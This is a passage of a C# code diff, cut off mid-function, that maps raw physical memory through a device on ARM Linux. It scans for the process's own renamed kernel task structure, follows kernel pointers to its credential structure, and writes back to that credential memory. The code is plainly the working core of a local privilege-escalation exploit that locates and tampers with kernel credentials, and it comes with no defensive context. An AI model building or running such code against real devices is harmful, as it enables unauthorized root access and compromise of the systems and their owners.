+    private static void ShootWaylandOutput(IntPtr screenshooter, IntPtr output, IntPtr buffer)
+    {
+        IntPtr arguments = Marshal.AllocHGlobal(2 * IntPtr.Size);
+        try
+        {
+            WriteWaylandArgument(arguments, 0, output);
+            WriteWaylandArgument(arguments, 1, buffer);
+            WlProxyMarshalArray(screenshooter, 0, arguments);
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(arguments);
+        }
+    }
+
+    private static void WriteWaylandArgument(IntPtr arguments, int index, IntPtr value)
+    {
+        Marshal.WriteIntPtr(arguments, index * IntPtr.Size, value);
+    }
+
+    private static void OnRegistryGlobal(IntPtr data, IntPtr registry, uint name, IntPtr interfaceName, uint version)
+    {
+        WaylandCaptureState state = (WaylandCaptureState)GCHandle.FromIntPtr(data).Target;
+        string value = Marshal.PtrToStringAnsi(interfaceName);
+        if (value == "wl_shm")
+        {
+            state.ShmName = name;
+            state.ShmVersion = version;
+        }
+        else if (value == "wl_output" && state.OutputName == 0)
+        {
+            state.OutputName = name;
+            state.OutputVersion = version;
+        }
+        else if (value == "screenshooter")
+        {
+            state.ScreenshooterName = name;
+            state.ScreenshooterVersion = version;
+        }
+    }
+
+    private static void OnRegistryGlobalRemove(IntPtr data, IntPtr registry, uint name)
+    {
+    }
+
+    private static void OnOutputGeometry(IntPtr data, IntPtr output, int x, int y, int physicalWidth, int physicalHeight, int subpixel, IntPtr make, IntPtr model, int transform)
+    {
+    }
+
+    private static void OnOutputMode(IntPtr data, IntPtr output, uint flags, int width, int height, int refresh)
+    {
+        WaylandCaptureState state = (WaylandCaptureState)GCHandle.FromIntPtr(data).Target;
+        if ((flags & 1) != 0 || state.Width == 0 || state.Height == 0)
+        {
+            state.Width = width;
+            state.Height = height;
+        }
+    }
+
+    private static void OnOutputDone(IntPtr data, IntPtr output)
+    {
+    }
+
+    private static void OnOutputScale(IntPtr data, IntPtr output, int factor)
+    {
+    }
+
+    private static int Mmap2Untouched(string[] arguments, int protection, string label)
+    {
+        long physicalAddress = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong lengthValue = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 4096;
+        if ((physicalAddress & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("physical address must be page aligned");
+            return 2;
+        }
+
+        UIntPtr length = new UIntPtr(lengthValue);
+        uint pageOffset = unchecked((uint)((ulong)physicalAddress >> 12));
+
+        return WithDevice(fileDescriptor =>
+        {
+            IntPtr address = SyscallMmap2(SysMmap2Arm, IntPtr.Zero, length, ProtectRead, MapShared, fileDescriptor, pageOffset);
+            if (address == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("mmap2 syscall failed errno={0}", error);
+                return 1;
+            }
+
+            int unmapResult = munmap(address, length);
+            if (unmapResult != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("munmap failed errno={0}", error);
+                return 1;
+            }
+
+            Console.WriteLine("{0} ok physical=0x{1:x} pgoff=0x{2:x} length=0x{3:x}", label, physicalAddress, pageOffset, lengthValue);
+            return 0;
+        });
+    }
+
+    private static int PagemapSelf()
+    {
+        IntPtr page = Marshal.AllocHGlobal(PageSize);
+        try
+        {
+            for (int index = 0; index < PageSize; index++)
+            {
+                Marshal.WriteByte(page, index, 0x5a);
+            }
+
+            ulong virtualAddress = unchecked((ulong)page.ToInt64());
+            ulong virtualPage = virtualAddress / PageSize;
+            long pagemapOffset = checked((long)(virtualPage * 8));
+            int fileDescriptor = open("/proc/self/pagemap", OpenReadOnly);
+            if (fileDescriptor < 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("open pagemap failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                IntPtr entryBuffer = Marshal.AllocHGlobal(8);
+                try
+                {
+                    IntPtr readCount = Pread64(fileDescriptor, entryBuffer, new UIntPtr(8), pagemapOffset);
+                    if (readCount.ToInt64() != 8)
+                    {
+                        int error = Marshal.GetLastWin32Error();
+                        Console.Error.WriteLine("pread pagemap failed count={0} errno={1}", readCount.ToInt64(), error);
+                        return 1;
+                    }
+
+                    ulong entry = unchecked((ulong)Marshal.ReadInt64(entryBuffer));
+                    bool present = (entry & (1UL << 63)) != 0;
+                    ulong pageFrameNumber = entry & ((1UL << 55) - 1);
+                    ulong physicalAddress = pageFrameNumber * PageSize + (virtualAddress & 0xfff);
+                    Console.WriteLine("virtual=0x{0:x}", virtualAddress);
+                    Console.WriteLine("entry=0x{0:x16}", entry);
+                    Console.WriteLine("present={0}", present);
+                    Console.WriteLine("pfn=0x{0:x}", pageFrameNumber);
+                    Console.WriteLine("physical=0x{0:x}", physicalAddress);
+                    Console.WriteLine("pfn_visible={0}", present && pageFrameNumber != 0);
+                    return 0;
+                }
+                finally
+                {
+                    Marshal.FreeHGlobal(entryBuffer);
+                }
+            }
+            finally
+            {
+                close(fileDescriptor);
+            }
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(page);
+        }
+    }
+
+    private static int Mmap2SameWrite(string[] arguments)
+    {
+        long physicalAddress = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x776a0000;
+        ulong lengthValue = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 4096;
+        int byteOffset = arguments.Length >= 4 ? (int)ParseInteger(arguments[3]) : 0;
+        if ((physicalAddress & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("physical address must be page aligned");
+            return 2;
+        }
+
+        if (byteOffset < 0 || (ulong)byteOffset >= lengthValue)
+        {
+            Console.Error.WriteLine("invalid byte offset");
+            return 2;
+        }
+
+        UIntPtr length = new UIntPtr(lengthValue);
+        uint pageOffset = unchecked((uint)((ulong)physicalAddress >> 12));
+
+        return WithDevice(fileDescriptor =>
+        {
+            IntPtr address = SyscallMmap2(SysMmap2Arm, IntPtr.Zero, length, ProtectRead | ProtectWrite, MapShared, fileDescriptor, pageOffset);
+            if (address == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("mmap2 syscall failed errno={0}", error);
+                return 1;
+            }
+
+            try
+            {
+                int checksumLength = lengthValue >= 64 ? 64 : (int)lengthValue;
+                ulong beforeChecksum = Checksum(address, checksumLength, out bool beforeAllZero, out bool beforeAllFF);
+                byte before = Marshal.ReadByte(address, byteOffset);
+                Marshal.WriteByte(address, byteOffset, before);
+                byte after = Marshal.ReadByte(address, byteOffset);
+                ulong afterChecksum = Checksum(address, checksumLength, out bool afterAllZero, out bool afterAllFF);
+                Console.WriteLine("same-write ok physical=0x{0:x} pgoff=0x{1:x} length=0x{2:x} byte_offset=0x{3:x}", physicalAddress, pageOffset, lengthValue, byteOffset);
+                Console.WriteLine("byte_stable={0}", before == after);
+                Console.WriteLine("checksum_before=0x{0:x16}", beforeChecksum);
+                Console.WriteLine("checksum_after=0x{0:x16}", afterChecksum);
+                Console.WriteLine("checksum_stable={0}", beforeChecksum == afterChecksum);
+                Console.WriteLine("all_zero={0}", beforeAllZero && afterAllZero);
+                Console.WriteLine("all_ff={0}", beforeAllFF && afterAllFF);
+                return before == after ? 0 : 1;
+            }
+            finally
+            {
+                int unmapResult = munmap(address, length);
+                if (unmapResult != 0)
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    Console.Error.WriteLine("munmap failed errno={0}", error);
+                }
+            }
+        });
+    }
+
+    private static int ScanPhysical(string[] arguments)
+    {
+        long start = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong totalLength = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 0x02000000;
+        string needleText = arguments.Length >= 4 ? arguments[3] : "Linux version";
+        int maxMatches = arguments.Length >= 5 ? (int)ParseInteger(arguments[4]) : 16;
+        if ((start & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("start must be page aligned");
+            return 2;
+        }
+
+        byte[] needle = Encoding.ASCII.GetBytes(needleText);
+        if (needle.Length == 0)
+        {
+            Console.Error.WriteLine("empty needle");
+            return 2;
+        }
+
+        int matches = 0;
+        return WithDevice(fileDescriptor =>
+        {
+            return ScanMappedMemory(fileDescriptor, start, totalLength, needle, maxMatches, physicalAddress =>
+            {
+                Console.WriteLine("match physical=0x{0:x}", physicalAddress);
+                matches++;
+                return true;
+            }, () =>
+            {
+                Console.WriteLine("matches={0}", matches);
+                return matches == 0 ? 1 : 0;
+            });
+        });
+    }
+
+    private static int TaskTagScan(string[] arguments)
+    {
+        long start = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong totalLength = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 0x60000000;
+        string tag = arguments.Length >= 4 ? arguments[3] : CreateDefaultTag();
+        int maxMatches = arguments.Length >= 5 ? (int)ParseInteger(arguments[4]) : 32;
+        if ((start & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("start must be page aligned");
+            return 2;
+        }
+
+        tag = NormalizeTaskName(tag);
+        byte[] needle = Encoding.ASCII.GetBytes(tag);
+        int setNameResult = SetTaskName(tag);
+        if (setNameResult != 0)
+        {
+            return setNameResult;
+        }
+
+        uint uid = getuid();
+        int pid = getpid();
+        int matches = 0;
+        Console.WriteLine("tag={0}", tag);
+        Console.WriteLine("pid={0}", pid);
+        Console.WriteLine("uid={0}", uid);
+        Console.WriteLine("comm={0}", File.ReadAllText("/proc/self/comm").Trim());
+
+        return WithDevice(fileDescriptor =>
+        {
+            return ScanMappedMemory(fileDescriptor, start, totalLength, needle, maxMatches, physicalAddress =>
+            {
+                Console.WriteLine("match physical=0x{0:x}", physicalAddress);
+                DescribeTaskTagCandidate(fileDescriptor, physicalAddress, uid, pid);
+                matches++;
+                return true;
+            }, () =>
+            {
+                Console.WriteLine("matches={0}", matches);
+                return matches == 0 ? 1 : 0;
+            });
+        });
+    }
+
+    private static int ScanMappedMemory(int fileDescriptor, long start, ulong totalLength, byte[] needle, int maxMatches, Func<ulong, bool> onMatch, Func<int> onComplete)
+    {
+        const ulong chunkLength = 0x100000;
+        byte[] chunk = new byte[chunkLength];
+        int matches = 0;
+        for (ulong scanned = 0; scanned < totalLength; scanned += chunkLength)
+        {
+            ulong remaining = totalLength - scanned;
+            ulong currentLength = remaining < chunkLength ? remaining : chunkLength;
+            long physicalAddress = checked(start + (long)scanned);
+            uint pageOffset = unchecked((uint)((ulong)physicalAddress >> 12));
+            IntPtr mapping = SyscallMmap2(SysMmap2Arm, IntPtr.Zero, new UIntPtr(currentLength), ProtectRead, MapShared, fileDescriptor, pageOffset);
+            if (mapping == new IntPtr(-1))
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("scan mmap2 failed physical=0x{0:x} errno={1}", physicalAddress, error);
+                return 1;
+            }
+
+            try
+            {
+                int currentLengthInt = checked((int)currentLength);
+                Marshal.Copy(mapping, chunk, 0, currentLengthInt);
+                int limit = currentLengthInt - needle.Length;
+                for (int index = 0; index <= limit; index++)
+                {
+                    if (Matches(chunk, index, needle))
+                    {
+                        matches++;
+                        if (!onMatch((ulong)physicalAddress + (ulong)index))
+                        {
+                            return 1;
+                        }
+
+                        if (matches >= maxMatches)
+                        {
+                            Console.WriteLine("matches={0}", matches);
+                            return 0;
+                        }
+                    }
+                }
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr(currentLength));
+            }
+        }
+
+        return onComplete();
+    }
+
+    private static bool Matches(byte[] chunk, int offset, byte[] needle)
+    {
+        for (int index = 0; index < needle.Length; index++)
+        {
+            if (chunk[offset + index] != needle[index])
+            {
+                return false;
+            }
+        }
+
+        return true;
+    }
+
+    private static string CreateDefaultTag()
+    {
+        return "qnp" + DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString("x", CultureInfo.InvariantCulture);
+    }
+
+    private static string NormalizeTaskName(string tag)
+    {
+        StringBuilder builder = new StringBuilder();
+        for (int index = 0; index < tag.Length && builder.Length < 15; index++)
+        {
+            char value = tag[index];
+            if ((value >= 'a' && value <= 'z') || (value >= 'A' && value <= 'Z') || (value >= '0' && value <= '9') || value == '_' || value == '-')
+            {
+                builder.Append(value);
+            }
+        }
+
+        if (builder.Length == 0)
+        {
+            return "qnp";
+        }
+
+        return builder.ToString();
+    }
+
+    private static int SetTaskName(string tag)
+    {
+        IntPtr buffer = Marshal.AllocHGlobal(16);
+        try
+        {
+            for (int index = 0; index < 16; index++)
+            {
+                Marshal.WriteByte(buffer, index, 0);
+            }
+
+            byte[] bytes = Encoding.ASCII.GetBytes(tag);
+            Marshal.Copy(bytes, 0, buffer, bytes.Length);
+            int result = prctl(PrSetName, buffer, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            if (result != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("prctl set name failed errno={0}", error);
+                return 1;
+            }
+
+            return 0;
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(buffer);
+        }
+    }
+
+    private static void DescribeTaskTagCandidate(int fileDescriptor, ulong physicalAddress, uint uid, int pid)
+    {
+        const int beforeLength = 0x8000;
+        const int afterLength = 0x8000;
+        ulong contextStart = physicalAddress >= beforeLength ? physicalAddress - beforeLength : 0;
+        ulong pageStart = contextStart & ~0xfffUL;
+        int matchOffset = checked((int)(physicalAddress - pageStart));
+        ulong neededLength = (ulong)(matchOffset + afterLength + 16);
+        ulong contextLengthValue = (neededLength + 0xfffUL) & ~0xfffUL;
+        int contextLength = checked((int)contextLengthValue);
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, (ulong)contextLength);
+        if (mapping == new IntPtr(-1))
+        {
+            int error = Marshal.GetLastWin32Error();
+            Console.WriteLine("candidate_context_unreadable errno={0}", error);
+            return;
+        }
+
+        try
+        {
+            int pidHits = 0;
+            int uidHits = 0;
+            int kernelPointers = 0;
+            StringBuilder pidRelatives = new StringBuilder();
+            StringBuilder uidRelatives = new StringBuilder();
+            for (int relative = -beforeLength; relative <= afterLength; relative += 4)
+            {
+                int offset = checked(matchOffset + relative);
+                if (offset < 0 || offset + 4 > contextLength)
+                {
+                    continue;
+                }
+
+                uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+                if (value == unchecked((uint)pid))
+                {
+                    pidHits++;
+                    AppendRelative(pidRelatives, relative);
+                }
+
+                if (value == uid)
+                {
+                    uidHits++;
+                    AppendRelative(uidRelatives, relative);
+                }
+
+                if (TryTranslateKernelVirtual(value, out ulong pointedPhysical))
+                {
+                    kernelPointers++;
+                }
+            }
+
+            if (pidHits != 0 || uidHits != 0 || kernelPointers != 0)
+            {
+                Console.WriteLine("candidate_summary pid_hits={0} pid_relatives={1} uid_hits={2} uid_relatives={3} kernel_pointers={4}", pidHits, pidRelatives, uidHits, uidRelatives, kernelPointers);
+            }
+
+            if (pidHits != 0)
+            {
+                PrintCredPointersNearCandidate(fileDescriptor, mapping, matchOffset, contextLength, physicalAddress, -beforeLength, afterLength, uid);
+                PrintCandidateWords(mapping, matchOffset, contextLength, -0x180, 0x60);
+                PrintCandidatePointerPreviews(fileDescriptor, mapping, matchOffset, contextLength, -0x80, 0x60, uid);
+            }
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr((uint)contextLength));
+        }
+    }
+
+    private static void PrintCredPointersNearCandidate(int fileDescriptor, IntPtr mapping, int matchOffset, int contextLength, ulong physicalAddress, int startRelative, int endRelative, uint uid)
+    {
+        int credLikePointers = 0;
+        for (int relative = startRelative; relative <= endRelative; relative += 4)
+        {
+            int offset = checked(matchOffset + relative);
+            if (offset < 0 || offset + 4 > contextLength)
+            {
+                continue;
+            }
+
+            uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+            if (!TryTranslateKernelVirtual(value, out ulong pointedPhysical))
+            {
+                continue;
+            }
+
+            if (TryDescribeCredPointer(fileDescriptor, value, pointedPhysical, uid, out string description))
+            {
+                credLikePointers++;
+                Console.WriteLine("cred_like pointer_location=0x{0:x} relative={1} {2}", AddRelative(physicalAddress, relative), relative, description);
+            }
+        }
+
+        Console.WriteLine("cred_scan cred_like={0}", credLikePointers);
+    }
+
+    private static void PrintCandidateWords(IntPtr mapping, int matchOffset, int contextLength, int startRelative, int endRelative)
+    {
+        for (int relative = startRelative; relative <= endRelative; relative += 0x20)
+        {
+            StringBuilder builder = new StringBuilder();
+            builder.AppendFormat(CultureInfo.InvariantCulture, "words relative={0}", relative);
+            for (int word = 0; word < 8; word++)
+            {
+                int currentRelative = relative + word * 4;
+                int offset = checked(matchOffset + currentRelative);
+                if (offset < 0 || offset + 4 > contextLength)
+                {
+                    builder.Append(" --------");
+                    continue;
+                }
+
+                uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+                builder.AppendFormat(CultureInfo.InvariantCulture, " {0:x8}", value);
+            }
+
+            Console.WriteLine(builder.ToString());
+        }
+    }
+
+    private static void PrintCandidatePointerPreviews(int fileDescriptor, IntPtr mapping, int matchOffset, int contextLength, int startRelative, int endRelative, uint uid)
+    {
+        int printed = 0;
+        for (int relative = startRelative; relative <= endRelative && printed < 24; relative += 4)
+        {
+            int offset = checked(matchOffset + relative);
+            if (offset < 0 || offset + 4 > contextLength)
+            {
+                continue;
+            }
+
+            uint value = unchecked((uint)Marshal.ReadInt32(mapping, offset));
+            if (!TryTranslateKernelVirtual(value, out ulong pointedPhysical))
+            {
+                continue;
+            }
+
+            Console.WriteLine("pointer_preview relative={0} virtual=0x{1:x8} physical=0x{2:x} {3}", relative, value, pointedPhysical, PreviewPhysicalWords(fileDescriptor, pointedPhysical, uid));
+            printed++;
+        }
+    }
+
+    private static string PreviewPhysicalWords(int fileDescriptor, ulong physicalAddress, uint uid)
+    {
+        ulong pageStart = physicalAddress & ~0xfffUL;
+        int pageOffset = checked((int)(physicalAddress - pageStart));
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize);
+        if (mapping == new IntPtr(-1))
+        {
+            return "preview_unreadable";
+        }
+
+        try
+        {
+            StringBuilder builder = new StringBuilder();
+            builder.Append("values=");
+            int uidHits = 0;
+            for (int index = 0; index < 16 && pageOffset + index * 4 + 4 <= PageSize; index++)
+            {
+                uint value = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset + index * 4));
+                if (value == uid)
+                {
+                    uidHits++;
+                }
+
+                if (index != 0)
+                {
+                    builder.Append(",");
+                }
+
+                builder.AppendFormat(CultureInfo.InvariantCulture, "{0:x8}", value);
+            }
+
+            builder.AppendFormat(CultureInfo.InvariantCulture, " uid_hits={0}", uidHits);
+            return builder.ToString();
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr((uint)PageSize));
+        }
+    }
+
+    private static ulong AddRelative(ulong value, int relative)
+    {
+        if (relative < 0)
+        {
+            return value - (ulong)(-relative);
+        }
+
+        return value + (ulong)relative;
+    }
+
+    private static void AppendRelative(StringBuilder builder, int relative)
+    {
+        if (builder.Length >= 80)
+        {
+            return;
+        }
+
+        if (builder.Length != 0)
+        {
+            builder.Append(",");
+        }
+
+        builder.Append(relative.ToString(CultureInfo.InvariantCulture));
+    }
+
+    private static IntPtr MapPhysical(int fileDescriptor, ulong physicalAddress, ulong length)
+    {
+        return MapPhysical(fileDescriptor, physicalAddress, length, ProtectRead);
+    }
+
+    private static IntPtr MapPhysical(int fileDescriptor, ulong physicalAddress, ulong length, int protection)
+    {
+        uint pageOffset = unchecked((uint)(physicalAddress >> 12));
+        return SyscallMmap2(SysMmap2Arm, IntPtr.Zero, new UIntPtr(length), protection, MapShared, fileDescriptor, pageOffset);
+    }
+
+    private static bool TryTranslateKernelVirtual(uint virtualAddress, out ulong physicalAddress)
+    {
+        physicalAddress = 0;
+        if (virtualAddress < 0xc0000000)
+        {
+            return false;
+        }
+
+        ulong candidate = (ulong)virtualAddress - 0xa0000000UL;
+        if (candidate < 0x20000000UL || candidate >= 0x80000000UL)
+        {
+            return false;
+        }
+
+        physicalAddress = candidate;
+        return true;
+    }
+
+    private static bool TryDescribeCredPointer(int fileDescriptor, uint virtualAddress, ulong physicalAddress, uint uid, out string description)
+    {
+        description = "";
+        if (!TryFindCredPointer(fileDescriptor, virtualAddress, physicalAddress, uid, out int bestOffset, out int bestRun, out uint usage))
+        {
+            return false;
+        }
+
+        description = string.Format(CultureInfo.InvariantCulture, "virtual=0x{0:x8} physical=0x{1:x} usage=0x{2:x8} uid_offset=0x{3:x} uid_run={4}", virtualAddress, physicalAddress, usage, bestOffset, bestRun);
+        return true;
+    }
+
+    private static bool TryFindCredPointer(int fileDescriptor, uint virtualAddress, ulong physicalAddress, uint uid, out int bestOffset, out int bestRun, out uint usage)
+    {
+        bestOffset = -1;
+        bestRun = 0;
+        usage = 0;
+        ulong pageStart = physicalAddress & ~0xfffUL;
+        int pageOffset = checked((int)(physicalAddress - pageStart));
+        const int readLength = 0x100;
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, PageSize);
+        if (mapping == new IntPtr(-1))
+        {
+            return false;
+        }
+
+        try
+        {
+            for (int offset = 0; offset <= readLength - 24 && pageOffset + offset + 24 <= PageSize; offset += 4)
+            {
+                int run = 0;
+                while (pageOffset + offset + run * 4 + 4 <= PageSize && offset + run * 4 < readLength)
+                {
+                    uint value = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset + offset + run * 4));
+                    if (value != uid)
+                    {
+                        break;
+                    }
+
+                    run++;
+                }
+
+                if (run > bestRun)
+                {
+                    bestRun = run;
+                    bestOffset = offset;
+                }
+            }
+
+            if (bestRun < 6)
+            {
+                return false;
+            }
+
+            usage = unchecked((uint)Marshal.ReadInt32(mapping, pageOffset));
+            return true;
+        }
+        finally
+        {
+            munmap(mapping, new UIntPtr(PageSize));
+        }
+    }
+
+    private static int UidRunScan(string[] arguments)
+    {
+        long start = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong totalLength = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 0x60000000;
+        uint uid = arguments.Length >= 4 ? unchecked((uint)ParseInteger(arguments[3])) : getuid();
+        int runLength = arguments.Length >= 5 ? (int)ParseInteger(arguments[4]) : 6;
+        int maxMatches = arguments.Length >= 6 ? (int)ParseInteger(arguments[5]) : 32;
+        if ((start & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("start must be page aligned");
+            return 2;
+        }
+
+        if (runLength < 2)
+        {
+            Console.Error.WriteLine("run length must be at least 2");
+            return 2;
+        }
+
+        Console.WriteLine("uid=0x{0:x}", uid);
+        Console.WriteLine("run_length={0}", runLength);
+        int matches = 0;
+        return WithDevice(fileDescriptor =>
+        {
+            const ulong chunkLength = 0x100000;
+            byte[] chunk = new byte[chunkLength];
+            for (ulong scanned = 0; scanned < totalLength; scanned += chunkLength)
+            {
+                ulong remaining = totalLength - scanned;
+                ulong currentLength = remaining < chunkLength ? remaining : chunkLength;
+                long physicalAddress = checked(start + (long)scanned);
+                IntPtr mapping = MapPhysical(fileDescriptor, (ulong)physicalAddress, currentLength);
+                if (mapping == new IntPtr(-1))
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    Console.Error.WriteLine("uid scan mmap2 failed physical=0x{0:x} errno={1}", physicalAddress, error);
+                    return 1;
+                }
+
+                try
+                {
+                    int currentLengthInt = checked((int)currentLength);
+                    Marshal.Copy(mapping, chunk, 0, currentLengthInt);
+                    int limit = currentLengthInt - runLength * 4;
+                    for (int index = 0; index <= limit; index += 4)
+                    {
+                        bool found = true;
+                        for (int runIndex = 0; runIndex < runLength; runIndex++)
+                        {
+                            if (ReadUInt32(chunk, index + runIndex * 4) != uid)
+                            {
+                                found = false;
+                                break;
+                            }
+                        }
+
+                        if (!found)
+                        {
+                            continue;
+                        }
+
+                        ulong matchPhysical = (ulong)physicalAddress + (ulong)index;
+                        Console.WriteLine("uid_run physical=0x{0:x} virtual_guess=0x{1:x8} {2}", matchPhysical, unchecked((uint)(matchPhysical + 0xa0000000UL)), PreviewChunkWords(chunk, index));
+                        matches++;
+                        if (matches >= maxMatches)
+                        {
+                            Console.WriteLine("matches={0}", matches);
+                            return 0;
+                        }
+                    }
+                }
+                finally
+                {
+                    munmap(mapping, new UIntPtr(currentLength));
+                }
+            }
+
+            Console.WriteLine("matches={0}", matches);
+            return matches == 0 ? 1 : 0;
+        });
+    }
+
+    private static int SelfCredSameWrite(string[] arguments, bool makePrivate)
+    {
+        long start = arguments.Length >= 2 ? ParseInteger(arguments[1]) : 0x20000000;
+        ulong totalLength = arguments.Length >= 3 ? (ulong)ParseInteger(arguments[2]) : 0x60000000;
+        string tag = arguments.Length >= 4 ? arguments[3] : CreateDefaultTag();
+        if ((start & 0xfff) != 0)
+        {
+            Console.Error.WriteLine("start must be page aligned");
+            return 2;
+        }
+
+        tag = NormalizeTaskName(tag);
+        int setNameResult = SetTaskName(tag);
+        if (setNameResult != 0)
+        {
+            return setNameResult;
+        }
+
+        uint uid = getuid();
+        uint gid = getgid();
+        if (makePrivate)
+        {
+            int gidResult = setresgid(gid, gid, gid);
+            if (gidResult != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("setresgid same-value failed errno={0}", error);
+                return 1;
+            }
+
+            int uidResult = setresuid(uid, uid, uid);
+            if (uidResult != 0)
+            {
+                int error = Marshal.GetLastWin32Error();
+                Console.Error.WriteLine("setresuid same-value failed errno={0}", error);
+                return 1;
+            }
+        }
+
+        int pid = getpid();
+        Console.WriteLine("tag={0}", tag);
+        Console.WriteLine("pid={0}", pid);
+        Console.WriteLine("uid={0}", uid);
+        Console.WriteLine("gid={0}", gid);
+        Console.WriteLine("private_cred_request={0}", makePrivate);
+        Console.WriteLine("comm={0}", File.ReadAllText("/proc/self/comm").Trim());
+
+        return WithDevice(fileDescriptor =>
+        {
+            if (!TryFindSelfCredential(fileDescriptor, start, totalLength, Encoding.ASCII.GetBytes(tag), uid, pid, out CredentialLocation location))
+            {
+                Console.Error.WriteLine("self credential not found");
+                return 1;
+            }
+
+            Console.WriteLine("self_task_physical=0x{0:x}", location.TaskPhysical);
+            Console.WriteLine("cred_pointer_relative={0}", location.PointerRelative);
+            Console.WriteLine("cred_virtual=0x{0:x8}", location.VirtualAddress);
+            Console.WriteLine("cred_physical=0x{0:x}", location.PhysicalAddress);
+            Console.WriteLine("cred_usage=0x{0:x8}", location.Usage);
+            Console.WriteLine("uid_offset=0x{0:x}", location.UidOffset);
+            Console.WriteLine("uid_run={0}", location.UidRun);
+            return SameWriteCredential(fileDescriptor, location, uid);
+        });
+    }
+
+    private static bool TryFindSelfCredential(int fileDescriptor, long start, ulong totalLength, byte[] needle, uint uid, int pid, out CredentialLocation location)
+    {
+        location = new CredentialLocation();
+        const ulong chunkLength = 0x100000;
+        byte[] chunk = new byte[chunkLength];
+        for (ulong scanned = 0; scanned < totalLength; scanned += chunkLength)
+        {
+            ulong remaining = totalLength - scanned;
+            ulong currentLength = remaining < chunkLength ? remaining : chunkLength;
+            ulong physicalAddress = (ulong)start + scanned;
+            IntPtr mapping = MapPhysical(fileDescriptor, physicalAddress, currentLength);
+            if (mapping == new IntPtr(-1))
+            {
+                continue;
+            }
+
+            try
+            {
+                int currentLengthInt = checked((int)currentLength);
+                Marshal.Copy(mapping, chunk, 0, currentLengthInt);
+                int limit = currentLengthInt - needle.Length;
+                for (int index = 0; index <= limit; index++)
+                {
+                    if (!Matches(chunk, index, needle))
+                    {
+                        continue;
+                    }
+
+                    ulong matchPhysical = physicalAddress + (ulong)index;
+                    if (TryFindCredentialNearTaskCandidate(fileDescriptor, matchPhysical, needle.Length, uid, pid, out location))
+                    {
+                        return true;
+                    }
+                }
+            }
+            finally
+            {
+                munmap(mapping, new UIntPtr(currentLength));
+            }
+        }
+
+        return false;
+    }
+
+    private static bool TryFindCredentialNearTaskCandidate(int fileDescriptor, ulong physicalAddress, int needleLength, uint uid, int pid, out CredentialLocation location)
+    {
+        location = new CredentialLocation();
+        const int beforeLength = 0x8000;
+        const int afterLength = 0x8000;
+        ulong contextStart = physicalAddress >= beforeLength ? physicalAddress - beforeLength : 0;
+        ulong pageStart = contextStart & ~0xfffUL;
+        int matchOffset = checked((int)(physicalAddress - pageStart));
+        ulong neededLength = (ulong)(matchOffset + afterLength + 16);
+        ulong contextLengthValue = (neededLength + 0xfffUL) & ~0xfffUL;
+        int contextLength = checked((int)contextLengthValue);
+        IntPtr mapping = MapPhysical(fileDescriptor, pageStart, (ulong)contextLength);
+        if (mapping == new IntPtr(-1))
+        {
+            return false;
+        }
+
+        try
+        {
+            if (!CandidateLooksLikeTaskComm(mapping, matchOffset, contextLength, needleLength))
+            {
+                return false;
+            }
+
+            if (!CandidateHasPid(mapping, matchOffset, contextLength, -0x1000, 0x400, pid))
+            {
+                return false;
+            }
+
+            for (int relative = -0x100; relative <= -8; relative += 4)
+            {
+                int realCredOffset = checked(matchOffset + relative);
+                int credOffset = checked(realCredOffset + 4);
+                if (realCredOffset < 0 || credOffset + 4 > contextLength)
+                {
+                    continue;
+                }
+
+                uint realCredVirtual = unchecked((uint)Marshal.ReadInt32(mapping, realCredOffset));
+                uint credVirtual = unchecked((uint)Marshal.ReadInt32(mapping, credOffset));
+                if (!TryTranslateKernelVirtual(realCredVirtual, out ulong realCredPhysical) ||
+                    !TryTranslateKernelVirtual(credVirtual, out ulong credPhysical))
+                {
+                    continue;
+                }
+
+                if (!TryFindCredPointer(fileDescriptor, realCredVirtual, realCredPhysical, uid, out int realUidOffset, out int realUidRun, out uint realUsage) ||
+                    !TryFindCredPointer(fileDescriptor, credVirtual, credPhysical, uid, out int credUidOffset, out int credUidRun, out uint credUsage))
+                {
+                    continue;
+                }
+
+                if (realUidOffset != 4 || credUidOffset != 4 || realUidRun < 8 || credUidRun < 8)
+                {
+                    continue;
+                }
+
